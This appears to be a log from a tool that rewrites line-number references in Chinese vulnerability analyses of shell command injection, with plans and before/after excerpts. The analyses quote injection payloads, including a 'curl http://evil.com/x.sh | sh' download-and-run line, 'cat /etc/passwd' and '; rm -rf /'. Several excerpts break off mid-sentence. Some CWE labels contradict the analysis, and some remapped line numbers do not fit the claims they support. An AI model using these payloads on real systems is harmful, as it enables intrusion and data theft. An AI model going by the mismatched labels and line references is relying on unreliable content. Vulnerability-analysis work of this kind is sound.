1. **第34行** `const cmd = \`git checkout ${branch} && rsync -avz --delete ./ /srv/${target}/\`;` 将 `branch` 和 `target` 直接拼接进 shell 命令字符串。`branch` 来自 `process.argv[3]`（第42行），攻击者可传入 `main; cat /etc/passwd` 等恶意值。
2. **第35行** `execSync(cmd, { shell: true })` 以 shell 模式执行拼接后的命令，构成命令注入的 sink。`target` 虽在第39行有白名单校验，但 `branch` 完全没有校验，攻击面独立存在。
3. **第46-47行** 安全对照路径 `deploySafe` 使用 `execFileSync` 传参数数组（第49-52行），不经过 shell，`branch` 中的特殊字符会被当作字面参数，有效阻断注入。
4. **第56-60行** 主流程中 `useSafe` 默认未设置时走第44行 `deployLegacy` 漏洞路径；即使启用 `SAFE_DEPLOY=1`，分支变量仍可能被复用，但安全函数已消除注入风险。
5. **结论** 存在 CWE-749 Exposed Dangerou
```

---

## row=285 status=partial

plan: [{"old": 24, "action": "keep", "style": "cn", "json": false}, {"old": 31, "action": "keep", "style": "cn", "json": false}, {"old": 35, "new": 27, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 tmp@L27"}, {"old": 36, "action": "human", "style": "cn", "json": false, "why": "唯一命中 27 但已被同组引用占用"}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 28, "action": "keep", "style": "line", "json": true}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 27, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. **第24行**：`target = data.get('target', '')` 从用户可控的JSON请求体获取 `target` 字段，未做任何过滤或类型校验，此处为不可信数据源（source）。
2. **第31行**：`if target not in allowed_dirs` 虽然增加了白名单检查，但注意 `allowed_dirs` 来自配置文件，且 `target` 是精确匹配。该防御仅能阻止非白名单目录名，但若白名单本身包含危险目录（如 `/tmp`），或攻击者利用路径拼接特性（如 `../`）仍可能绕过——不过此处精确匹配确实限制了直接注入。
3. **第35行**：`cmd = "rm -rf /tmp/ops_cache/" + target` 直接使用字符串拼接构造shell命令，`target` 被嵌入到命令中。**第36行**：`os.system(cmd)` 使用默认shell执行该命令，未设置 `shell=False`，也未使用 `subprocess` 的列表参数或 `shlex.quote` 转义。
4. **关键漏洞点**：尽管有白名单，但白名单检查与命令执行之间存在 **TOCTOU** 风险（配置可能被修改），且更直接的是——若 `allowed_dirs` 配置中包含如 `a;ls` 这样的值（配置误写或恶
```

**AFTER**:
```text
**分析过程**

1. **第24行**：`target = data.get('target', '')` 从用户可控的JSON请求体获取 `target` 字段，未做任何过滤或类型校验，此处为不可信数据源（source）。
2. **第31行**：`if target not in allowed_dirs` 虽然增加了白名单检查，但注意 `allowed_dirs` 来自配置文件，且 `target` 是精确匹配。该防御仅能阻止非白名单目录名，但若白名单本身包含危险目录（如 `/tmp`），或攻击者利用路径拼接特性（如 `../`）仍可能绕过——不过此处精确匹配确实限制了直接注入。
3. **第27行**：`cmd = "rm -rf /tmp/ops_cache/" + target` 直接使用字符串拼接构造shell命令，`target` 被嵌入到命令中。**第36行**：`os.system(cmd)` 使用默认shell执行该命令，未设置 `shell=False`，也未使用 `subprocess` 的列表参数或 `shlex.quote` 转义。
4. **关键漏洞点**：尽管有白名单，但白名单检查与命令执行之间存在 **TOCTOU** 风险（配置可能被修改），且更直接的是——若 `allowed_dirs` 配置中包含如 `a;ls` 这样的值（配置误写或恶
```

---

## row=291 status=partial

plan: [{"old": 55, "action": "keep", "style": "cn", "json": false}, {"old": 68, "action": "keep", "style": "cn", "json": false}, {"old": 66, "action": "keep", "style": "cn", "json": false}, {"old": 70, "action": "keep", "style": "cn", "json": false}, {"old": 48, "action": "keep", "style": "cn", "json": false}, {"old": 75, "action": "human", "style": "cn", "json": false, "why": "越界且无锚点/插值可用"}, {"old": 64, "action": "keep", "style": "cn", "json": false}, {"old": 78, "new": 44, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 args.length@L44"}, {"old": 50, "action": "keep", "style": "line", "json": true}, {"old": 39, "action": "keep", "style": "line", "json": true}, {"old": 49, "action": "keep", "style": "line", "json": true}, {"old": 38, "action": "keep", "style": "line", "json": true}, {"old": 39, "action": "keep", "style": "line", "json": true}, {"old": 38, "action": "keep", "style": "line", "json": true}, {"old": 38, "action": "keep", "style": "line", "json": true}, {"old": 50, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. **第55行** `execSync(runCmd, { shell: true, stdio: 'inherit' })` 是命令注入的 sink。`shell: true` 明确启用 shell 解释，`runCmd` 由字符串拼接生成（第48-49行），其中 `command` 直接来自 `process.argv`（第68行），未经过任何过滤或转义。

2. **数据流追踪**：第66行 `const command = cmdParts.join(' ')` 将用户提供的所有参数用空格连接，第70行调用 `pullAndRun(image, tag, command)`，最终在第48行拼入 `docker run` 命令。攻击者可通过传入 `; rm -rf /` 或 `$(malicious)` 等 payload 实现任意命令执行。

3. **防御缺失验证**：第75行 `resolveTagFromBranch` 对 branch 做了字符白名单过滤，但该函数只作用于 tag，不涉及 command。第41-43行虽然从环境变量读取 registry，但也未对 command 做任何约束。整个调用链中没有任何 `shlex.quote`、参数数组或白名单校验。

4. **反例排除**：第64行对参数数量做了校验（`args.length
```

**AFTER**:
```text
**分析过程**

1. **第55行** `execSync(runCmd, { shell: true, stdio: 'inherit' })` 是命令注入的 sink。`shell: true` 明确启用 shell 解释，`runCmd` 由字符串拼接生成（第48-49行），其中 `command` 直接来自 `process.argv`（第68行），未经过任何过滤或转义。

2. **数据流追踪**：第66行 `const command = cmdParts.join(' ')` 将用户提供的所有参数用空格连接，第70行调用 `pullAndRun(image, tag, command)`，最终在第48行拼入 `docker run` 命令。攻击者可通过传入 `; rm -rf /` 或 `$(malicious)` 等 payload 实现任意命令执行。

3. **防御缺失验证**：第75行 `resolveTagFromBranch` 对 branch 做了字符白名单过滤，但该函数只作用于 tag，不涉及 command。第41-43行虽然从环境变量读取 registry，但也未对 command 做任何约束。整个调用链中没有任何 `shlex.quote`、参数数组或白名单校验。

4. **反例排除**：第64行对参数数量做了校验（`args.length
```

---

## row=293 status=partial

plan: [{"old": 46, "new": 26, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 github.com@L26"}, {"old": 53, "action": "human", "style": "cn", "json": false, "why": "唯一命中 26 但已被同组引用占用"}, {"old": 54, "new": 16, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 clone@L16"}, {"old": 46, "action": "human", "style": "cn", "json": false, "why": "唯一命中 26 但已被同组引用占用"}, {"old": 24, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 31, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 16, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 24, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程：**

1. **第43-44行**：`repoUrl` 和 `branchName` 来自外部 webhook 的 JSON 解析结果，属于不可信输入源。虽然第46行对 `repoUrl` 做了 `https://github.com/` 前缀校验，但 `branchName` 没有任何校验。

2. **第53行**：`branch` 被直接拼接到 `execSync` 的命令字符串中。`execSync` 底层通过 shell 执行命令，等价于 `os.system` 的 Node.js 版本。

3. **第54行**：攻击者可构造 `branchName` 为 `main; curl http://evil.com/x.sh | sh; #`，命令解析后变为 `git clone --branch main; curl http://evil.com/x.sh | sh; # https://github.com/...`，实现任意命令执行。

4. **第46行**：`repoUrl` 的前缀校验仅限制 URL 格式，不影响 `branchName` 的注入路径。即使 URL 合法，`branchName` 仍可注入恶意 shell 命令。

5. **结论**：存在 CWE-78 OS Command Injection
```json
{"has_vu
```

**AFTER**:
```text
**分析过程：**

1. **第43-44行**：`repoUrl` 和 `branchName` 来自外部 webhook 的 JSON 解析结果，属于不可信输入源。虽然第26行对 `repoUrl` 做了 `https://github.com/` 前缀校验，但 `branchName` 没有任何校验。

2. **第53行**：`branch` 被直接拼接到 `execSync` 的命令字符串中。`execSync` 底层通过 shell 执行命令，等价于 `os.system` 的 Node.js 版本。

3. **第16行**：攻击者可构造 `branchName` 为 `main; curl http://evil.com/x.sh | sh; #`，命令解析后变为 `git clone --branch main; curl http://evil.com/x.sh | sh; # https://github.com/...`，实现任意命令执行。

4. **第46行**：`repoUrl` 的前缀校验仅限制 URL 格式，不影响 `branchName` 的注入路径。即使 URL 合法，`branchName` 仍可注入恶意 shell 命令。

5. **结论**：存在 CWE-78 OS Command Injection
```json
{"has_vu
```

---

## row=299 status=remapped_clean

plan: [{"old": 33, "action": "keep", "style": "cn", "json": false}, {"old": 39, "action": "keep", "style": "cn", "json": false}, {"old": 43, "new": 33, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 shell@L33"}, {"old": 31, "action": "keep", "style": "line", "json": true}, {"old": 34, "action": "keep", "style": "line", "json": true}, {"old": 22, "action": "keep", "style": "line", "json": true}, {"old": 25, "action": "keep", "style": "line", "json": true}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 31, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. 第33行：`imageName` 直接来自请求体，未经任何转义或参数化处理，是攻击者可控的输入源（source）。
2. 第39行：白名单仅校验了 `registry` 部分（即 `imageName.split('/')[0]`），但攻击者可以构造 `registry.internal:5000/;cat /etc/passwd`，此时 `registry` 为合法值，绕过白名单。
3. 第42-43行：`cmd` 通过字符串拼接构造，`exec()` 默认使用 shell 执行。攻击者在 `imageName` 中注入 shell 元字符（如 `;`、`&&`、`$(...)`）即可执行任意命令，形成命令注入（CWE-78 OS Command Injection
4. 第43行：`exec` 的回调函数将 `stderr` 直接返回给客户端，可泄露命令执行结果，放大漏洞影响。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-918 Server-Side Request Forgery (SSRF)", "risk_level": "Critical", "source": "line 31: const cmd = `docker ${action} ${imageNam
```

**AFTER**:
```text
**分析过程**

1. 第33行：`imageName` 直接来自请求体，未经任何转义或参数化处理，是攻击者可控的输入源（source）。
2. 第39行：白名单仅校验了 `registry` 部分（即 `imageName.split('/')[0]`），但攻击者可以构造 `registry.internal:5000/;cat /etc/passwd`，此时 `registry` 为合法值，绕过白名单。
3. 第42-43行：`cmd` 通过字符串拼接构造，`exec()` 默认使用 shell 执行。攻击者在 `imageName` 中注入 shell 元字符（如 `;`、`&&`、`$(...)`）即可执行任意命令，形成命令注入（CWE-78 OS Command Injection
4. 第33行：`exec` 的回调函数将 `stderr` 直接返回给客户端，可泄露命令执行结果，放大漏洞影响。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-918 Server-Side Request Forgery (SSRF)", "risk_level": "Critical", "source": "line 31: const cmd = `docker ${action} ${imageNam
```

---

## row=326 status=remapped_clean

plan: [{"old": 23, "action": "keep", "style": "cn", "json": false}, {"old": 21, "action": "keep", "style": "cn", "json": false}, {"old": 37, "new": 29, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 cat@L29"}, {"old": 21, "action": "keep", "style": "cn", "json": false}, {"old": 34, "action": "keep", "style": "cn", "json": false}, {"old": 21, "action": "keep", "style": "cn", "json": false}, {"old": 35, "action": "keep", "style": "cn", "json": false}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 30, "action": "keep", "style": "line", "json": true}, {"old": 16, "action": "keep", "style": "line", "json": true}, {"old": 31, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 22, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 13, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**  
1. 第23行：`log_file` 来自外部参数（`$1`），未经过滤即用于路径拼接，但第21行已用 `[[ -f ]]` 做了存在性检查，可阻断直接路径穿越。  
2. 第34-36行：`command` 变量通过字符串拼接将 `$log_file` 直接嵌入 `cat` 命令，随后第37行 `eval` 执行——攻击者可传入 `$(malicious_command)` 或 `; malicious_command` 绕过第21行的文件检查（因为 `$(...)` 会在 `[[ -f ]]` 求值后、`eval` 前被展开）。  
3. 第34行 `analysis_tool` 为固定路径（无用户输入），但 `$log_file` 的注入点在 `eval` 上下文中，可执行任意命令，属于典型 CWE-134 Use of Externally-Controlled Format String
4. 反例排除：第21行 `[[ -f ]]` 仅验证文件存在，不阻止命令替换；第35行 `echo` 只是输出，不改变 `eval` 的危险性。  
5. 结论：漏洞成立，攻击者通过构造 `log_file` 参数实现远程代码执行。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 
```

**AFTER**:
```text
**分析过程**  
1. 第23行：`log_file` 来自外部参数（`$1`），未经过滤即用于路径拼接，但第21行已用 `[[ -f ]]` 做了存在性检查，可阻断直接路径穿越。  
2. 第34-36行：`command` 变量通过字符串拼接将 `$log_file` 直接嵌入 `cat` 命令，随后第29行 `eval` 执行——攻击者可传入 `$(malicious_command)` 或 `; malicious_command` 绕过第21行的文件检查（因为 `$(...)` 会在 `[[ -f ]]` 求值后、`eval` 前被展开）。  
3. 第34行 `analysis_tool` 为固定路径（无用户输入），但 `$log_file` 的注入点在 `eval` 上下文中，可执行任意命令，属于典型 CWE-134 Use of Externally-Controlled Format String
4. 反例排除：第21行 `[[ -f ]]` 仅验证文件存在，不阻止命令替换；第35行 `echo` 只是输出，不改变 `eval` 的危险性。  
5. 结论：漏洞成立，攻击者通过构造 `log_file` 参数实现远程代码执行。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 
```

---

## row=354 status=human

plan: [{"old": 67, "action": "human", "style": "cn", "json": false, "why": "越界且无锚点/插值可用"}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 24, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 18, "action": "keep", "style": "line", "json": true}, {"old": 12, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 24, "action": "keep", "style": "line", "json": true}]

(无改动)

---

## row=369 status=partial

plan: [{"old": 36, "action": "keep", "style": "cn", "json": false}, {"old": 43, "action": "keep", "style": "cn", "json": false}, {"old": 56, "new": 41, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 cleanup_workspace@L41"}, {"old": 51, "action": "keep", "style": "cn", "json": false}, {"old": 53, "action": "keep", "style": "cn", "json": false}, {"old": 56, "new": 49, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 os.system@L49"}, {"old": 56, "action": "human", "style": "cn", "json": false, "why": "越界且无锚点/插值可用"}, {"old": 47, "action": "keep", "style": "line", "json": true}, {"old": 49, "action": "keep", "style": "line", "json": true}, {"old": 49, "action": "keep", "style": "line", "json": true}, {"old": 47, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
---

**分析过程**

1. **第36行（`trigger_build` 函数）**：`cmd` 使用列表形式 `['/usr/bin/make', 'build', f'PROJ={project}']` 且 `shell=False`（第43行），即使 `project` 来自用户输入，`subprocess` 也会将其作为单个参数传递，不经过 shell 解释，因此无命令注入风险——这是正确防御。

2. **第56行（`cleanup_workspace` 函数）**：`os.system(f'rm -rf /tmp/ci/{workspace}')` 将用户可控的 `workspace` 直接拼接到 shell 命令字符串中。攻击者可提交 `workspace = "test; cat /etc/passwd"` 或 `"../../etc"` 实现任意命令执行或路径穿越。

3. **数据流追踪**：`request.get_json()`（第51行）→ `data['workspace']`（第53行）→ `os.system`（第56行）。全程无任何过滤、转义或白名单校验，`workspace` 未经验证直接进入 shell。

4. **对比验证**：第36-43行的 `subprocess` 列表参数是有效防御，但第56行未采用相同模式，表明漏洞是真实的
```

**AFTER**:
```text
---

**分析过程**

1. **第36行（`trigger_build` 函数）**：`cmd` 使用列表形式 `['/usr/bin/make', 'build', f'PROJ={project}']` 且 `shell=False`（第43行），即使 `project` 来自用户输入，`subprocess` 也会将其作为单个参数传递，不经过 shell 解释，因此无命令注入风险——这是正确防御。

2. **第41行（`cleanup_workspace` 函数）**：`os.system(f'rm -rf /tmp/ci/{workspace}')` 将用户可控的 `workspace` 直接拼接到 shell 命令字符串中。攻击者可提交 `workspace = "test; cat /etc/passwd"` 或 `"../../etc"` 实现任意命令执行或路径穿越。

3. **数据流追踪**：`request.get_json()`（第51行）→ `data['workspace']`（第53行）→ `os.system`（第49行）。全程无任何过滤、转义或白名单校验，`workspace` 未经验证直接进入 shell。

4. **对比验证**：第36-43行的 `subprocess` 列表参数是有效防御，但第56行未采用相同模式，表明漏洞是真实的
```

---

## row=374 status=human

plan: [{"old": 38, "action": "keep", "style": "cn", "json": false}, {"old": 16, "action": "keep", "style": "cn", "json": false}, {"old": 58, "action": "human", "style": "cn", "json": false, "why": "越界且无锚点/插值可用"}, {"old": 24, "action": "keep", "style": "line", "json": true}, {"old": 25, "action": "keep", "style": "line", "json": true}, {"old": 22, "action": "keep", "style": "line", "json": true}, {"old": 24, "action": "keep", "style": "line", "json": true}, {"old": 33, "action": "keep", "style": "line", "json": true}]

(无改动)

---

## row=376 status=remapped_clean

plan: [{"old": 34, "action": "keep", "style": "cn", "json": false}, {"old": 49, "new": 32, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 ping@L32"}, {"old": 35, "action": "keep", "style": "cn", "json": false}, {"old": 31, "action": "keep", "style": "line", "json": true}, {"old": 33, "action": "keep", "style": "line", "json": true}, {"old": 32, "action": "keep", "style": "line", "json": true}, {"old": 45, "action": "keep", "style": "line", "json": true}, {"old": 32, "action": "keep", "style": "line", "json": true}, {"old": 33, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
分析过程：
1. 第34行：`cmdStr := fmt.Sprintf("ping -c 4 %s", cfg.Target)` 将用户可控的 `cfg.Target` 直接拼接到 shell 命令字符串中，`cfg.Target` 来源于第49行 `parseConfig` 解析的 `rawMsg`，而 `rawMsg` 是外部输入。
2. 第35行：`exec.Command("sh", "-c", cmdStr)` 使用 `sh -c` 执行拼接后的字符串，等价于 `os.system` 的语义，没有经过任何过滤或转义。
3. 第48-50行：`rawMsg` 中 `127.0.0.1; cat /etc/passwd` 的分号 `;` 会被 shell 解释为命令分隔符，导致执行 `ping -c 4 127.0.0.1` 后继续执行 `cat /etc/passwd`，形成命令注入。
4. 第36-40行：命令输出被捕获并打印，攻击者可以获取敏感文件内容或执行任意系统命令，影响定时任务所在主机的机密性和完整性。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 
```

**AFTER**:
```text
分析过程：
1. 第34行：`cmdStr := fmt.Sprintf("ping -c 4 %s", cfg.Target)` 将用户可控的 `cfg.Target` 直接拼接到 shell 命令字符串中，`cfg.Target` 来源于第32行 `parseConfig` 解析的 `rawMsg`，而 `rawMsg` 是外部输入。
2. 第35行：`exec.Command("sh", "-c", cmdStr)` 使用 `sh -c` 执行拼接后的字符串，等价于 `os.system` 的语义，没有经过任何过滤或转义。
3. 第48-50行：`rawMsg` 中 `127.0.0.1; cat /etc/passwd` 的分号 `;` 会被 shell 解释为命令分隔符，导致执行 `ping -c 4 127.0.0.1` 后继续执行 `cat /etc/passwd`，形成命令注入。
4. 第36-40行：命令输出被捕获并打印，攻击者可以获取敏感文件内容或执行任意系统命令，影响定时任务所在主机的机密性和完整性。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "Critical", "source": "line 
```

---

